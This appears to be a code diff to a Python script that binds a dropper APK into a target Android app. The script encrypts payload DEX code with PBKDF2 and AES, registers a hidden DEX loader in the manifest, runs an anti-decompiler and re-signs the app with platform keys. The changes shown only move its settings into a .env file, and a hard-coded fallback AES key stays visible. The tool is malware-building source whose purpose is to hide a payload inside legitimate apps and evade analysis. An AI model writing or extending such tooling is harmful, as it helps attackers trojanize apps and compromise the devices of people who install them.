@@ -5,6 +5,14 @@ import subprocess
 import shutil
 import zipfile
 from datetime import datetime
+
+# Load .env from the script's own directory before anything else so every
+# os.environ.get() call below picks up the values.
+try:
+    from dotenv import load_dotenv as _load_dotenv
+    _load_dotenv(os.path.join(os.path.dirname(os.path.abspath(__file__)), '.env'))
+except ImportError:
+    pass  # python-dotenv not installed; fall back to real env vars / defaults
 from PIL import Image
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend as _crypto_backend
@@ -94,7 +102,22 @@ def run_java(args, **kwargs):
 
 # Fallback key — used only if per-build key generation fails.
 # Real builds always generate a fresh key in bind_apk().
-AES_KEY = bytes.fromhex('b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1')
+# Value is read from AES_KEY in .env (or the environment); the hex literal
+# here is the hard-coded last-resort default if neither source is set.
+AES_KEY = bytes.fromhex(
+    os.environ.get('AES_KEY',
+                   'b7fcadb82c9ee0bf873c9c1b670285c22814b69201d01fe640cb2e409131b7f1')
+)
+
+# PBKDF2 iteration count for payload DEX key derivation (from .env).
+PBKDF2_ITERATIONS = int(os.environ.get('PBKDF2_ITERATIONS', '65536'))
+
+# Dropper APK filename (from .env); resolved to an absolute path in bind_apk.
+DROPPER_APK = os.environ.get('DROPPER_APK', 'Dropper.apk')
+
+# Signing key / cert paths (from .env); may be absolute or relative to script dir.
+PLATFORM_KEY  = os.environ.get('PLATFORM_KEY',  'key.pk8')
+PLATFORM_CERT = os.environ.get('PLATFORM_CERT', 'certificate.pem')
 
 def aes_encrypt(data, key=None):
     if key is None:
@@ -1064,7 +1087,7 @@ def _pbkdf2_aes_encrypt_dex(dex_bytes: bytes, password: str) -> bytes:
         algorithm=hashes.SHA1(),
         length=16,
         salt=salt,
-        iterations=65536,
+        iterations=PBKDF2_ITERATIONS,
         backend=_crypto_backend(),
     )
     key = kdf.derive(password.encode('utf-8'))
@@ -1611,7 +1634,7 @@ def _register_dex_loader_in_manifest(manifest_path: str, new_package: str,
         print(f'    note: _register_dex_loader_in_manifest: {e}')
 
 
-def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.apk"):
+def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk=None):
     timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
     work_dir = f"dropper_work_{timestamp}"
     target_work_dir = f"target_work_{timestamp}"
@@ -1620,9 +1643,14 @@ def bind_apk(target_apk_path, user_icon_path, output_name, dropper_apk="Dropper.
     apktool_jar = os.path.join(script_dir, 'apktool.jar')
     antidecompiler_jar = os.path.join(script_dir, 'AntiDecompiler.jar')
     apksigner_jar = os.path.join(script_dir, 'apksigner.jar')
-    dropper_path = os.path.join(script_dir, dropper_apk)
-    platform_key = os.path.join(script_dir, 'key.pk8')
-    platform_cert = os.path.join(script_dir, 'certificate.pem')
+    # Resolve dropper / signing paths from env (.env → os.environ) with sane defaults.
+    _dropper_name = dropper_apk or DROPPER_APK
+    dropper_path  = _dropper_name if os.path.isabs(_dropper_name) \
+                    else os.path.join(script_dir, _dropper_name)
+    _pk  = PLATFORM_KEY  if os.path.isabs(PLATFORM_KEY)  else os.path.join(script_dir, PLATFORM_KEY)
+    _pc  = PLATFORM_CERT if os.path.isabs(PLATFORM_CERT) else os.path.join(script_dir, PLATFORM_CERT)
+    platform_key  = _pk
+    platform_cert = _pc
 
     target_apk_path = os.path.abspath(target_apk_path)
     if user_icon_path:
